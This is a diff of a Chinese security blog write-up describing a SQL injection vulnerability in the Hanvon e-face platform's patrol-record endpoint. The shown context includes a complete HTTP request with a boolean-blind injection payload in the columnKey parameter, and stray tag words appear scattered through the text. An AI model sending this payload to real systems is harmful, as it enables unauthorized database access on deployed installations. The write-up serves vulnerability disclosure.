@@ -59,14 +59,6 @@ List<PatrolRecordVO> recordVOList = this.patrolRecordDsm.queryAllPatrolRecord(re
 List<PatrolRecordVO> queryAllPatrolRecord(PatrolRecordParams var1);
 ```
 
-深入探索
-
-黑客
-
-博客资源与服务
-
-data
-
 和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 PatrolRecordDsm.xml
 
 黑客与破解
@@ -116,7 +108,7 @@ getDailyPatrolRecord.do 也存在同样的sql注入[漏洞](https://mrxn.net/tag
 
 > 布尔盲注
 >
-> 编程
+> 软件
 
 ```
 GET /manage/patrolRecord/getAllRecord.do?recoToken=67mds2pxXQb&page=1&pageSize=10&columnKey=pr.SIGN_TIME+RLIKE+(SELECT+(CASE+WHEN+(2962%3d2962)+THEN+0x70722e5349474e5f54494d45+ELSE+0x28+END))%23+wAOm&order=desc&id=2&startTime=2025-05-02&endTime=2025-05-03&communityId=1&planId=1&lineId=1&teamId=1 HTTP/1.1
@@ -131,4 +123,4 @@ Host: hanvon.mrxn.net
 
 响应结果是不一样的
 
-软件
+计算机安全
